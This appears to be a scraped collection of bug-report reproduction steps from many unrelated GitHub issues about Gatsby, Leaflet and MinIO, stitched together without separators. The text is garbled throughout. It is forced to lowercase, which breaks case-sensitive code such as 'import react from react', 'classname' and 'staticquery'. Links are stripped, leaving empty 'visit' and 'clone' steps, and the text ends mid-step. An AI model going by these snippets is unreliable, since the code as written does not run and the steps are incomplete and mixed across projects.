my gatsby-browser.js looks like this:
const react = require("react");
const layout = require("components/layout").default; exports.wrappageelement = ({ element, props }) => ( <layout {...props}>{element}</layout>
layout.js extends purecomponent and implements a posegroup in its render method, while keeping the main navigation and footer persistent.
open in a browser
`cd examples/using-page-transitions`
`npm install`
`gatsby develop`
visit
click a site
- put a syntax error inside `gatsby-node.js`
- execute `gatsby develop`
see repo at cc @pieh
command line:
gatsby new hello-world #v2
cd hello-world
gatsby develop change content in src/pages/index.js
install next gatsby
`gatsby new title` && `cd title`
`gatsby develop`
open link in the background
check for the title in the tab
clone
run `yarn workspace gatsby-mdx-docs develop` to start the gatsby dev server for the `examples/docs` package.
visit ` `.
change some content in `examples/docs/content/docs/api-reference.mdx` and save the file.
create typography.js file containing:
import typography from 'typography'
const typography = new typography({ basefontsize: '18px', baselineheight: 1.666, headerfontfamily: [ 'sfprotext-regular', 'avenir next', 'helvetica neue', 'segoe ui', 'helvetica', 'arial', 'sans-serif', ], bodyfontfamily: ['sfprotext-regular', 'avenir next', 'helvetica neue', 'segoe ui', 'helvetica', 'arial', 'sans-serif',], // see below for the full list of options.
}) export default typography
``` follow remaining set-up instructions for typography.js and gatsby-plugin-typography.
run gatsby build && gatsby serve
log the excerpt value in the test
i'm not sure how to provide an easy steps to reproduce
however i'll open a pr to fix
init the project by running these commands ([gist url]( if you want to check content):
gatsby new failing-routes #v2
cd failing-routes
yarn add gatsby-transformer-remark@next gatsby-source-filesystem@next
mkdir -p src/templates
curl -lo gatsby-config.js '
curl -lo gatsby-node.js '
curl -lo src/templates/markdown-page.js '
``` then add a page and start dev mode:
echo "#test 1" > src/pages/test1.md
yarn develop
``` now let's create a new file
echo "#test 2" > src/pages/test2.md
``` you can check the new page is not accessible compared to the first one:
*
* even if the content and the page have been generated (
{ content: allmarkdownremark { edges { node { fileabsolutepath html } } } pages: allsitepage(filter: {path: {regex: "/^/test/"}}) { edges { node { id path context { slug } } } }
i used contentful as an external source here, but i would expect it can be reproduced with any other external source page generator
example repo: 1
run `enable_gatsby_refresh_endpoint=true gatsby develop`
add a new page to the external source
refresh gatsby sources `curl -x post `
try to load the new page
specify a blue text color using a negative hue value
**style.css:**
.foo { color: hsl(-150, 100%, 40%);
``` **index.js:**
import './style.css'
``` this renders correctly with `gatsby develop`, as the color value is unchanged.
i've made an example project here: repro steps are:
- create a new v2 project using the gatsby cli
- add `pathprefix` to `gatsby-config.js`
- copy `public` to `prod-build/foo`
- serve locally with `npx serve prod-build`
- navigate to ` ` or ` ` and both get redirected to ` `
make a build with path prefix set
clear any existent application data
go to website
observe that it works the first time
reload the page
observe a 404 message
check your server logs
observe that a 404 was generated from a request to `/offline-plugin-app-shell-fallback/index.html`, that is without pathprefix.
add gatsby filesystem source and sharp transform
run `develop`
observe the path of the image
build and prefix paths
observe `public/d/123/path---mypage......json` for the cached query result.
* install `gatsby-plugin-remove-trailing-slashes` to a project using `gatsby-plugin-offline 2.0.0-rc.2`
* build project
* run `gatsby-serve` * verify workbox has cached
* navigate from the homepage to an internal page that had its path auto created (e.g
from mypage.jsx), refresh the page and you'll be redirected to /offline-plugin-app-shell-fallback
i have a repo that reproduces this if required.
> _note_: this needs a reproduction if anyone is able to provide it! a config like this: ```js
// gatsby-config.js
module.exports = { plugins: [ { resolve: `plugin-styled-jsx`, options: { plugins: ['styled-jsx-plugin-postcss'] }, }, ],
include `pathprefix: '/reponame,` in `gatsby-config.js`.
use npm script `"deploy": "gatsby build --prefix-paths && gh-pages -d public",` or take a look at my repo (with master and gh-pages branches) where problem is occurring: repo:
this seems to be due to the fact that gatsby encodes assets smaller than 10 kb as base64 strings and inserts them directly into the markup
in my case, the relevant file is my `favicon.png` (9 kb)
i import in a `react-helmet` component: ```
import react from 'react'
import helmet from \'react-helmet\' import favicon from \'../assets/favicon.png\' const head = ({ site, pagetitle, path, description, children }) => { const title = pagetitle ? `${pagetitle} | ${site.title}` : site.title const pageurl = path ? site.url + path : site.url const desc = description || site.description return ( <helmet> <title>{title}</title> <meta property="og:type" content="website" /> {pagetitle && <meta property="og:title" content={pagetitle} />} <meta property="og:url" content={pageurl} /> <meta property="og:description" content={desc} /> <meta name="description" content={desc} /> // this line throws the error <link rel="icon" type="image/png" href={favicon} /> {children} </helmet> )
} export default head
this is a component defined in the `components` directory that never loads:
import react from 'react';
import { staticquery, graphql } from 'gatsby'; const layout = ({ children, location }) => ( <staticquery query={graphql` query sitedata { site { sitemetadata { title description keywords } } allcontentfulproject { edges { node { id name slug } } } } `} render={data => ( {children} )} />
); export default layout;
``` browser:
![image]( react tree:
![image]( when i remove the extra whitespace and format the code like this it works: ```js
import react from 'react';
import { staticquery, graphql } from 'gatsby'; const layout = ({ children, location }) => ( <staticquery query={graphql` query sitedata { site { sitemetadata { title description keywords } } allcontentfulproject { edges { node { id name slug } } } }
`} render={data => ( {children} )} />
); export default layout;
using this wraprootelement implementation the issue appears:
import react from 'react'
import { graphql, staticquery } from 'gatsby' export const wraprootelement = ({ element }) => ( <staticquery query={graphql` query { site { sitemetadata { title } } } `} render={data => element} />
``` when using this code, the context is empty which seems to be the reason.
import react from 'react'
import { staticquerycontext } from 'gatsby' export const wraprootelement = ({ element }) => ( <staticquerycontext.consumer> {staticquerydata => { console.log(staticquerydata) return element }} </staticquerycontext.consumer>
install the default gatsby v2 starter, run `gatsby build && gatsby serve` and note that the production css is minified
(so far, so good.) now, run `npm i gatsby-plugin-postcss precss autoprefixer` and add `gatsby-plugin-postcss` to `gatsby-config`
then, add a `postcss.config.js` file to the project root: ```js
// postcss.config.js module.exports = { plugins: [require(`precss`), require(`autoprefixer`)()],
``` finally, run `gatsby build && gatsby serve` again.
- check out the gatsby store at this commit
- run `yarn`
- run `yarn run build`
- see the build fail with an error see related pr for workaround:
this repo has a simplified reproduction and tracks my fix for it:
note: i'm not sure where resetting the `sheetsregistry` should occur
i just placed it after the `tostring()` call because that seemed the easiest place to put it.
have a page that conditionally redirects
such as an account page.
`if (!loggedin()) return <redirect to="/login" />`
clone the repo:
sadly i can't reproduce it or don't know where it's coming from
two days before this error occurred the first time, then yesterday everything worked fine again
today this error is breaking my development server again.
clone the reproduction repo:
run `gatsby build` and `gatsby serve`.
- `git clone `
- `cd k-legrand.com`
- `git checkout pre-production`
- `yarn dev` or `gatsby develop`
in a component/layout do:
`import "../../../node_modules/jquery/dist/jquery"`
`import "../../../node_modules/bootstrap/dist/js/bootstrap.bundle.min"`
include `gatbsy-plugin-react-css-modules` with valid react-css-module options, eg: ```js { resolve: 'gatsby-plugin-react-css-modules', options: { handlemissingstylename: 'warn' }
git clone -b without-page-creator
cd guido.nyc
gatsby develop # in new tab
echo "test" >> src/pages/about/index.md
i've been able to recreate this in `gatsby-starter-default`:
(the only change is artificial padding added to the first page above the `/page-2` `<link>`) - visit
- on the home page, scroll down to the `page-2` link and click it - on `page-2`, now click 'go back to the homepage'
- install `"gatsby-plugin-typography": "next"`
- add `utils/typography.js` file, mine has the following: ```
import typography from 'typography';
import './../fonts/ddchardware-regular.otf';
import './../fonts/ddchardware-condensed.otf';
import './../fonts/ddchardware-compressed.otf'; const typography = new typography({ title: 'makerfaire', scaleratio: 8, headerfontfamily: ['ddchardware-regular'], bodyfontfamily: ['open sans'], overridestyles: ({ adjustfontsizeto, rhythm }, options, styles) => ({ h1: { textshadow: `2px 2px 0 red` }, 'h1 > span': { fontsize: rhythm(3) } })
}) export default typography
- run `gatsby develop`
- make a change in the above config file and save.
see below in **file contents** 2
or if you upgrade the gatsby package to 2.0.0-beta.106 in gatsbytagram you get the same result when opening a modal
or download the gatsbygram example > `yarn install` > `gatsby develop` and you get the same issue right out of the box.
running either `gatsby develop` (will proceed) or `gatsby build` (fails build) this is the start of the query in `src/templates/case.js`: ```
export default casetemplate export const pagequery = graphql` query casequery($slug: string!) { case: prismiccase(uid: { eq: $slug }) { content: data { title { text } client { text }
``` i have exactly the same setup for `src/templates/blog.js` and no errors whatsoever, which makes it extra weird.
- clone
- install dependencies and run `npm run develop`
- edit `src/pages/lint-css/index.md` and save
- first edit doesn't cause errors and content is updated
- edit `src/pages/lint-css/index.md` and save again
- we get browser errors, `data` (graphql results) are not passed to page component
- create a starter gatsby v2 project
- get it working with `gatsby-mdx`
- put a ton of images/gifs/videos into your static folder (not sure if that's what's causing this but worth mentioning as i have in my blog project)
- make an `.mdx` post that contains a react component
- edit said post
- wish you were never born
go to: and observe the blank page that website is just a copy of [gatsby-starter-default v2](
open #create-a-gatsby-site
page will remain on top rather then navigating to create a site
#create-a-site
you can use example of [using-gatsby-image](
change file
diff --git a/examples/using-gatsby-image/src/pages/traced-svg.js b/examples/using-gatsby-image/src/pages/traced-svg.js
index a22dadc..2963bc3 100644
--- a/examples/using-gatsby-image/src/pages/traced-svg.js
+++ b/examples/using-gatsby-image/src/pages/traced-svg.js
@@ -185,7 +185,7 @@ export const query = graphql` quality: 80 tracesvg: { background: "#f2f8f3", color: "#d6ebd9" } ) {
- ...gatsbyimagesharpfluid_tracedsvg
+ ...gatsbyimagesharpfluid_withwebp_tracedsvg } } }
visit page and test nav bar links, especially `traced-svg`
i've created a [demo repo available here](
to reproduce the error, install dependencies with yarn and run `gatsby build`.
create a new project from
add gatsby-plugin-offline
deploy and test offline this setup is deployed here if you want to try:
(you can see the issue with sw on the console)
create a page like `/demo/`
import { push } from 'gatsby' ..
push('/demo/?testparam=1');
``` location props on `router` and `scrollcomponent`:
`{pathname: '/demo/', search: '?testparam=1', ...}` location props on `jsonstore` :
`{pathname: '/demo/', search: '', ...}`
i've created a [repo to demonstrate this bug]( 1
`git clone git@github.com:danoc/gatsby-react-docgen-repro.git && cd gatsby-react-docgen-repro && yarn && yarn develop`
see warning in console.
- navigate to
- click on "tracing backend examples"
- click back button
- observe nothing happens
clear steps describing how to reproduce the issue
`$ gatsby build`
background: file( relativepath: { eq: "my-fancy.jpg" } ){ childimagesharp { sizes( maxwidth: 1200, maxheight: 450, duotone: { shadow: "#222222", highlight: "#454848" }, quality: 80 ){ ...gatsbyimagesharpsizes } }
clone the [gatsby-starter-default v2]( add this to the `gatsby-node.js` file
exports.createpages = ({actions}) => { const { createredirect } = actions; createredirect({ frompath: '/foo.html', redirectinbrowser: true, topath: '/bar', });
and then try to visit the `/foo.html` url
- demo:
- repo: ```
# clone the repo
git clone
cd gatsby-remark-images-link-override-bug/ # install dependencies
npm i # start the repo
npm run develop
``` load `
add a link header to the `allpageheaders` option in `gatsby-config-js`
run `gatsby build`.
install gatsby-plugin-google-analytics (version 2.0.0-beta.3)
in gatsby-config.js, in the plugin options, add `anonymize: false`
build the project with `gatsby build` / `yarn build` command.
open the site in a web-browser and inspect the page source code.
use a gatsby v2 starter
`gatsby new my-default-project #v2`
`gatsby develop` to compile the build
`^c` to stop the server
`mv my-default-project my-project` rename the project folder
`gatsby develop` to compile the build again
you can checkout out my [repo]( and try building it yourself.
`gatsby new tutorial-part-two #v2`
`cd tutorial-part-two` 3
`npm install --save gatsby-plugin-typography react-typography typography`
`gatsby develop`
for convenience, i've created a [gist]( which has the set of files to reproduce the problem
#### setup the project
gatsby new foo
npm i --save gatsby-plugin-stylus stylus
``` #### add the files src/pages/index.js
import react from "react"
import style from "./index.module.styl" export default () => <div classname={style.red}>hello world!</div>
``` src/pages/index.module.styl
red color: red
``` gatsby-config.js
module.exports = { plugins: [ `gatsby-plugin-stylus` ],
``` #### build the project
`gatsby build` #### serve the site
`python -m simplehttpserver 8000` #### access the site on your browser
i just clone `gatsby new my-default-project #v2`, `gatsby-starter-blog` and `npm run build` you'll get this error
``` 7 | // check if module is in cache 8 | if(installedmodules[moduleid]) {
> 9 | return installedmodules[moduleid].exports; | ^ 10 | } 11 | // create a new module (and put it into the cache) 12 | var module = installedmodules[moduleid] = { webpackerror: typeerror: promise.map is not a function - bootstrap:9 promise lib/webpack/bootstrap:9:1 - objectwithoutproperties.js:11 new promise [lib]/[@babel]/runtime/helpers/objectwithoutproperties.js:11:1 - bootstrap:5 module.exports lib/webpack/bootstrap:5:1 - bootstrap:35 webpack.run lib/webpack/bootstrap:35:1
install node.js v6, then build and serve a gatsby site
here i've used [`nvm`]( - `nvm install lts/boron`
- `nvm use lts/boron`
- `gatsby new tutorial-part-one `
- `cd tutorial-part-one`
- `gatsby build`
- `gatsby serve`
`typography.js`: ```js
const typo = new typography({ googlefonts: [ { name: 'open sans', styles: ['300', '400', '700'], }, ], bodyfontfamily: ['open sans', 'sans-serif'], headerfontfamily: ['open sans', 'sans-serif'],
export default typo;
in your functional layout component assign, inside your `<saticquery/>`, your graphql query to a const like: ```jsx
const layout = ({ children }) => { const layoutquery = graphql` query sitetitlequery { site { sitemetadata { title } } } ` return ( <staticquery query={layoutquery} // something else /> )
build a website on a clean stage that uses gatsby-plugin-sharp
if you do `mkdir -p public/static` before build it works
- set up gatsby site with contentful
- create webhook to target `__refresh` using ngrok
- set environment variable `enable_gatsby_refresh_endpoint=true`
- update content in contentful
use gatsby default starter (v2)
pull the `html.js` out of `.cache/` and into `src/`
delete the `prop-types` import
run build or develop command
clone [`gatsby-barebones-markdown`](
check out the commit m-allanson/gatsby-barebones-markdown@0eef913da54ef5b009790414ef43c1f432b28212
`yarn develop`
navigate in a browser to page "b" (
change something in the markdown content of `src/pages/b.md`
return to the browser
no hot reloading change will be visible.
reload the browser
no change will be visible.
write a local plugin that attempts to add source nodes with an empty `package.json` file.
follow directions by copying content from the docs into a .babelrc file in the root of project
run `gatsby develop` or `gatsby build`
clone a brand new project using gatsby v2
change any style block
save file and wait to see changes in the browser.
install gatsby from scratch or starter theme, in this case i used `gatsby new my-site #2` run `gatsby build`
this can be reproduced at or by going to the website with a throttled network connection and scrolling down before render() is called.
edit any file so it needs to hot reload
clone [this demo repo]( and run `gatsby develop`
i put a gatsby custom block at the bottom of the hello world post (` `)
```javascript
// layout.js const layout = ({ children }) => <div>{children}</div>
``` ```javascript
// homepage.js export default () => ( <layout> <staticquery query={graphql` query homepage { site { sitemetadata { author } } }` } render={data => <h1>{data.site.sitemetadata.author}</h1>} /> </layout>
``` ```javascript
// gatsby-config.js module.exports = { sitemetadata: { author: 'cody brunner' }
just try to clone this repository, install `npm i` and run `npm start` -
- create new project
- use the createpage api and have a `(` or a `)` in the path
createpage({ path: `/article/url(testing)`, component: path.resolve(`src/template/template.js`), })
[super basic repro available here.](
open any gatsby page in google translate.
include image in css module
use (import) css module
import any code in `gatsby-browser.js` that runs browser-only code.
- visit on a device with a small screen (ex: 13" macbook pro), or resize the browser window viewport to a small height (below 760px in this case)
- enter a query/term into the search field (ex: `styling`) that might result in a large amount of returned results
- view that the bottom of the modal appears to be cutoff
example repo: production build: reload the site while offline (after installing the service worker).
create a gatsby v2 site using css (rather than css-in-js)
in development, the styles will be applied via a `link` tag (causing a flash of unstyled content)
in production, the styles are inlined, leading to the same smooth loading experience as in v1.
- clone the [`next` branch]( of `gatsby-starter-typescript-plus`.
- open the `./layouts/index.tsx` component.
- remove the semicolons inside the `staticqueryprops` type.
get the `using-typescript` example from [here](
change the default export in `src/pages/index.tsx` to this:
```typescript
export default class index extends react.purecomponent<indexpageprops> { public render () { const { sitename } = this.props.data.site.sitemetadata return ( <layout> <h1>hello typescript world!</h1> <p> this site is named <strong>{sitename}</strong> </p> </layout> ) }
run `gatsby develop`.
use `import { link } from "gatsby"`,
deploy it to netlify and try clicking the generated links.
- open next.gatsbyjs.org in ie 11
- observe "unhandled promise rejection referenceerror: \'promise\' is undefined" error thrown in console longs
see video + [my repo](
use an integer > 32bit (e.g
3000000000) in markdown frontmatter or json attribute and query it in graphiql or use [this demo repo]( and follow the readme.
configure a 2.x gatsby site with the 2.x version of the gatsby-plugin-netlify-cms plugin.
upgraded to latest beta releases of gatsby v2 as recommended in the v2 beta announcement blog.
#l73-l107 when running `gatsby develop` the above mentioned error occurs.
- set up a [gatsby dev environment]( #contributing-to-the-repo)
- change the graphql fragments in a gatsby plugin, e.g
`gatsby-transformer-sharp/src/fragments.js`
- run `gatsby-dev` to use your modified gatsby on a test site
- note that the fragments have not been updated in your test site ### steps to fix manually - manually copy from `/projects/gatsby-repo/packages/gatsby-transformer-sharp/src/fragments.js` to `/projects/gatsby-test-site/node_modules/gatsby-transformer-sharp/src/fragments.js`
- delete your site's `.cache` directory
- run `gatsby develop` and note that the correct fragments are now being used
clone this repo
run `yarn build`
it will throw the error.
run `yarn develop`, it will just work.
`gatsby new test`
`cd test; npm i gatsby@latest`
`npm run develop`
visit ` ` in the browser
install `gatsby-plugin-netlify-cms`
run `gatsby develop`
visit <
start voiceover (`command` + `f5`)
use the tab key to focus on a link in the gatsbyjs.org navigation
"click" the link using `control` + `option` + `space` it will announce that it is following the link, but will not announce the next page.
`gatsby new gatsby-site`
`yarn add styled-components` `layouts/index.js` file:
import { themeprovider } from 'styled-components'
const layout = ({ children, data }) => ( <themeprovider theme={{ foo: { bar: 'baz' } }}> ..
</themeprovider>
``` `404.js` file:
import react from 'react'
import styled from 'styled-components' const debugger = styled.div` ${({ theme }) => console.log(theme.foo.bar)};
` const notfoundpage = props => ( <div> <h1>not found</h1> <p>you just hit a route that doesn&#39;t exist..
the sadness.</p> <debugger /> </div>
) export default notfoundpage
you can use strava-activities and have some activities that have a max speed of a whole number
i also tracked it down and was able to make a test case ```
diff --git a/packages/gatsby/src/schema/__tests__/infer-graphql-input-type-test.js b/packages/gatsby/src/schema/__tests__/infer-graphql-input-type-test.js
index 95d9f2b0..e0300c7b 100644
--- a/packages/gatsby/src/schema/__tests__/infer-graphql-input-type-test.js
+++ b/packages/gatsby/src/schema/__tests__/infer-graphql-input-type-test.js
@@ -229,6 +229,16 @@ describe(`graphql input args`, () => { ) }) + it(`handles a mix of float and int`, async () => {
+ let fields = inferinputobjectstructurefromnodes({
+ { speed: 1 },
+ { speed: 2.1 },
+ }).inferredfields
+ expect(fields.speed.type.tostring()).tocontain(`float`)
+ it(`replaces unsupported values in keys`, () => { // add a key with unsupported values to test // if they're replaced.
i forked the client-only-paths example, added a page named search and namespaced the client only routes
you'll see that the ssr page is never rendered
however, if you change its name it will behave as expected
clone [simonyiszk/mvk-web@5d80daac7f951904746aede0ee88f9dc2e9dc59e](
install dependencies using `yarn`
run `yarn develop` and see the news section of the home page:
![image]( the issue can be fixed by changing the content of `src/pages/index.jsx`.
you can reproduce the issue in the gatsby.org site
visit: which is an invalid link.
set up a gatsby@2 project, run `yarn add gatsby-plugin-sass@2.0.0-alpha.11 gatsby-plugin-react-helmet@2.0.12-3` and then run `gatsby develop`.
in the v2 branch, run `yarn run dev` or `yarn run build` on the gatsbygram example.
visit this [page]( #prerequisites) and click on anchor link to see it
add a codeblock to a markdown doc containing, for example an iframe: ```
<iframe src=" " frameborder="0" allowfullscreen></iframe>
install `gatsby-source-filesystem` and `gatsby-transformer-json`
create a file under `./src/data/posts/posts.json`,
in `posts.json`, add an object with an id key with the value as a number (e.g
`"id": 42`)
run `gatsby develop`
get the error above the solution is to use strings, instead of numbers for id.
you can see it on even the gatsbyjs site.
create a file with css custom properties example:
#### 2
import it into a css module example:
#l1 #### 3. the compiled output replaces custom properties with hard-coded values source:
#l52-l53 output:
<img width="1108" alt="screen shot 2018-05-04 at 11 33 50 am" src=" ">
(updated on 5/03/2018 to make it easier to reproduce) 1
`gatsby new gatsby-blog `
`gatsby build`
`gatsby serve` and open up the url in safari
keep this tab/window open
make a change by adding a new page i.e
my-thrid-post
run `gatsby build` and `gatsby serve` again
go back to safari and refresh the page
you will see that the js in no longer working and there is an error in the console
if you open a new tab or new window then everything works as expected
this potential "bug" only occurs in safari
my question is whether or not this is something that can be resolved or if it is just how safari differs in some way from other browsers in keeping the old js in the session cached.
run `gatsby serve` after running `gatsby build`
npm install --global gatsby-cli
gatsby new gatsby-site
cd gatsby-site
gatsby build
gatsby serve
fork ` ` 2
add site to netlify
deploy site surge 1
clone ` `
`gatsby build`
`surge public/`
navigate to site
visit demo page
compare images in **resize** part with the original [images]( i also checked that problem on my local test code.
- clone the repo
i made it very minimal to help isolate the problem.
- run `gatsby develop`.
- go to ` ` if gatsby is served from port 8080.
- post content should show up just fine.
- edit and save the file `src/posts/one.md` a few times
this is the content of the post.
- blog post content goes blank.
clone 2
run yarn && yarn dev 3
open a blog page 4
make a change to any markdown file within `src/pages/` 5
see that the page now fails to load with a react error, and refreshing does not work
use an old, slow windows computer (haha
i wish i had written down more details about their computer specs)
install gatsby cli (@kyleamathews do your remember the commands we had them run here? and is this list of steps correct according to your memory?)
run `gatsby new my-new-site`
run `gatsby develop`
open localhost:8000
navigate to a route that doesn't exist and see the dev 404 page
follow the instructions to add a new page component for that route
the browser doesn't refresh with the new page.
- go to gatsbyjs.org and type a query into the search box.
- click on a result to navigate to another page
- click back onto the search input
- see that search results panel does not open note that clicking anywhere else on the page, then clicking back to the search input _does_ bring up the results panel
![apr-16-2018 12-35-03](
use json content like this: ```
{ tags: ['a', 'b']
``` then try to fetch for content which contains tag 'a' with this query: ```
query testquery($tag: string) { allcontentjson(filter: { tags: { in: [$tag]}}) { totalcount }
see 1
make a node with a field named `field name` and value `field value` * (i originally did this with gatsby-source-airtable)
write a query for that field in the graphiql explorer for `field_name`
execute the query (this is also kevzettler/gatsby-source-airtable#2, but near as i can tell the header normalization is happening in gatsby and it makes sense to keep the field normalization in the same place.)
query for a contentful image, requesting dimensions larger than the image
look at the response url, width, and height fields
compare actual image dimensions with those reported.
see this repo
happens regularly (but not always) when i deploy
please let me know if there's something else i can provide to investigate
thanks a lot for your time and keep up the good work!
create a gatsby content type with a "single reference" field 2\\
add two entries to that reference field of different types 3\\
observe the generated graphql schema for that content type ..
this came out of investigation + context in #3495
add graphql query to `src/layouts/index.js` 2\\
add `src/pages/404.js` component using data from this query 3\\
run `gatsby build` followed by `gatsby serve` and navigate to non-existent page
i've tried all solutions mentioned here: and none of it helped
(i was adding those to html.js) ...
steps to reproduce the behavior:
- hold shift and drag over map
steps to reproduce the behavior:
- set up a basic map, with a control that has a button in it, which listens for click events and posts the events to the console
- click the button in the control using safari on a mac
- see two click events in the console, one with `istrusted:true` and another with `istrusted:false` attributes (using 'force touch' to click the button on a trackpad results in only a single click event being emitted, but it also triggers the safari preview popup.)
var fg = l.featuregroup();
console.log(fg.getbounds());
var lg = l.layergroup().addto(fg)
console.log(fg.getbounds()); // throws error
``` **current code**
getbounds: function() { var bounds = new latlngbounds(); for (var id in this._layers) { var layer = this._layers[id]; bounds.extend(layer.getbounds ? layer.getbounds() : layer.getlatlng()); } return bounds;
- add an image overlay to the map
- press alternatively + and - key to continually zoom in and zoom out
- during zooming the image sometime dancing around and refit
- bellow a gif that illustrate the issue ![leaflet_image_overlay_dancing](
import the following packages:
import { map } from "leaflet/src/map"
import { icon } from "leaflet/src/layer/marker/icon"
import { marker } from "leaflet/src/layer/marker/marker"
import { tilelayer } from "leaflet/src/layer/tile/tilelayer"
import "leaflet/src/layer/vector/renderer.getrenderer"
with those imports one can render a marker on the map but not drag it.
steps to reproduce the behavior:
- create a shadow root.
- append the leaflet css to the shadow root.
- create a node for leaflet.
- attach a map to the node.
- add a click handler to the map.
- append the node to the shadow root.
steps to reproduce the behavior:
modify the svgoverlay example in the docs to specify a class:
`l.svgoverlay(svgelement, svgelementbounds, {classname: 'myclass'}).addto(map);`
- step 1: open a simple map using tiles, like
- step 2: start a mouse selection, from the bottom-right (attribution control) to the upper-left corner
- step 3: in ie11 tiles are selected, displaying a blue color
that doesn't happen in other browsers, such as latest chrome 72.
- create canvas map with geojson layer with some lines
- add mouseover/mouseout events to geojson objects
- the mouseover function makes lines thicker / mouseout makes them thinner
steps to reproduce the behavior:
check out [this fiddle](
drag the map to change its center
roll the mouse over the circle marker
zoom out to the point where the high res tilelayer (url set to cloudfront) disappears due to it's minzoom setting.
click the hide button.
error (see image below)
remove `minzoom: 18`
repeat steps 1 & 2 above
steps to reproduce the behavior:
- scroll in to level where data is not available
for example somewhere on atlanticaocean
- when get "map data not available" picture set maxnativezoom to smaller and call tilelayer.redraw() function.
i do not have a publicly available instance
can setup a time to share environment via meet/zoom
mc policy set download /path/to/bucket
upload file (while user with readwrite)
minio server version release.2020-08-18t19-41-00z minio_volumes="/content" /dev/mapper/vg1-content on /content type xfs (rw,nodev,noexec,relatime,attr2,inode64,sunit=1024,swidth=4096,noquota) /dev/mapper/vg1-content this lvm volume on mdraid /dev/md126 added 4 disks /dev/sd[m...p] to md126 mdadm /dev/md126 --add /dev/sdm /dev/sdn /dev/sdo /dev/sdp
sudo mdadm --grow /dev/md6 --raid-devices=12 md126 : active raid10 sdo[9] sdp[8] sdm[11] sdn[10] sdj[5] sdh[3] sdl[7] sdf[1] sdk[6] sde[0] sdi[4] sdg[2] 39065219072 blocks super 1.2 512k chunks 2 near-copies [12/12] [uuuuuuuuuuuu] [=====>...............] reshape = 27.1% (10620569280/39065219072) finish=1216.3min speed=389742k/sec bitmap: 0/146 pages [0kb], 131072kb chunk minio server swapped (use 2gb from 16gb memory and 100% swap 16gb), hangs and freeze dedicated server
in logs: sep 17 23:36:39 s3 kernel: [ 4109.687644] kswapd0 d 0 145 2
sep 17 23:36:39 s3 kernel: [ 4109.687648] call trace:
sep 17 23:36:39 s3 kernel: [ 4109.687659] __schedule+ /
sep 17 23:36:39 s3 kernel: [ 4109.687665] schedule+ /
sep 17 23:36:39 s3 kernel: [ 4109.687747] xlog_wait+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.687754] ? wake_up_q+ /
sep 17 23:36:39 s3 kernel: [ 4109.687830] __xfs_log_force_lsn+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.687836] ? radix_tree_node_ctor+ /
sep 17 23:36:39 s3 kernel: [ 4109.687905] ? __xfs_iunpin_wait+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.687975] xfs_log_force_lsn+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.688042] ? xfs_reclaim_inode+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.688108] __xfs_iunpin_wait+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.688116] ? init_wait_var_entry+ /
sep 17 23:36:39 s3 kernel: [ 4109.688180] xfs_reclaim_inode+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.688246] xfs_reclaim_inodes_ag+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.688252] ? radix_tree_gang_lookup_tag+ /
sep 17 23:36:39 s3 kernel: [ 4109.688258] ? discard_new_inode+ /
sep 17 23:36:39 s3 kernel: [ 4109.688262] ? list_lru_walk_one+ /
sep 17 23:36:39 s3 kernel: [ 4109.688326] xfs_reclaim_inodes_nr+ / [xfs]
sep 17 23:36:39 s3 kernel: [ 4109.688333] super_cache_scan+ /
sep 17 23:36:39 s3 kernel: [ 4109.688337] do_shrink_slab+ /
sep 17 23:36:39 s3 kernel: [ 4109.688341] shrink_slab+ /
sep 17 23:36:39 s3 kernel: [ 4109.688346] ? __switch_to_asm+ /
sep 17 23:36:39 s3 kernel: [ 4109.688351] shrink_node+ /
sep 17 23:36:39 s3 kernel: [ 4109.688355] kswapd+ /
sep 17 23:36:39 s3 kernel: [ 4109.688360] ? mem_cgroup_shrink_node+ /
sep 17 23:36:39 s3 kernel: [ 4109.688365] kthread+ /
sep 17 23:36:39 s3 kernel: [ 4109.688369] ? kthread_bind+ /
sep 17 23:36:39 s3 kernel: [ 4109.688372] ret_from_fork+ /
sep 17 23:36:39 s3 kernel: [ 4109.688408] info: task md126_resync:2260 blocked for more than 120 seconds.
previously:
[root@server minio]# ./minio -v
minio version release.2020-05-08t02-40-49z
[root@server minio]#
[root@server minio]# ./mc mb -l minio/test
bucket created successfully `minio/test`.
[root@server minio]# ./mc lock minio/test governance 1d
governance mode is enabled for 1days
[root@server minio]# ./mc cp /etc/hosts minio/test/hosts
/etc/hosts: 344 b / 344 b 7.23 kib/s 0s[root@server minio]#
[root@server minio]#
[root@server minio]# ./mc cp /etc/hosts minio/test/hosts
mc: <error> failed to copy `/etc/hosts`
object is worm protected and cannot be overwritten now:
[root@server minio]# ./minio -v
minio version release.2020-09-05t07-14-49z
[root@server minio]# ./mc mb -l minio/test
bucket created successfully `minio/test`.
[root@server minio]#
[root@server minio]# ./mc lock minio/test governance 1d
governance mode is enabled for 1days
[root@server minio]#
[root@server minio]# ./mc cp /etc/hosts minio/test/hosts
/etc/hosts: 344 b / 344 b 46.93 kib/s 0s [root@server minio]#
[root@server minio]#
[root@server minio]# ./mc cp /etc/hosts minio/test/hosts
/etc/hosts: 344 b / 344 b 50.31 kib/s 0s [root@server minio]#
[root@server minio]#
[root@server minio]# ./mc ls minio/test/hosts --versions
[2020-09-06 02:42:59 edt] 344b hosts (2nd, vid=bbb2711b-4771-4e69-a764-3ef4b8c8ad64)
[2020-09-06 02:42:56 edt] 344b hosts (1st, vid=2d4db8a4-267c-427a-882d-d845f7238722)
start the proxy:
docker run -p 9000:9000 --name azure-s3 \\ -e "minio_access_key=xxx" \\ -e "minio_secret_key=xxx" \\ -e "minio_azure_chunk_size_mb=0.25" \\ minio/minio gateway azure
run an apache flink job (version 1.11.1) with a streamingfilesink that points to the minio endpoint.
when flink tries to checkpoint the data, minio throws an error and after a few retries the flink job aborts.
``` streamingfilesink<t> filesink = streamingfilesink .forbulkformat(new path("s3://bucket/"), parquetavrowriters.forreflectrecord(clazz)) .build();
mount a storagebox via smb
try to setup minio with the storagebox
run similar commands to above using `time` before the `mc` commands on a cold dataset and then again over the same set
try to build minio on macos with nix.
set up hadoop 3.2.1 and spark version 3.0.0
copied over latest version of relevant jars noted in cookbook, add appropriate env variables to my shell startup and checked they worked
ran the minio server on my mac with directory `/usr/local/sparkdata` set with appropriate ownership and permissions
used mc config to set up 4
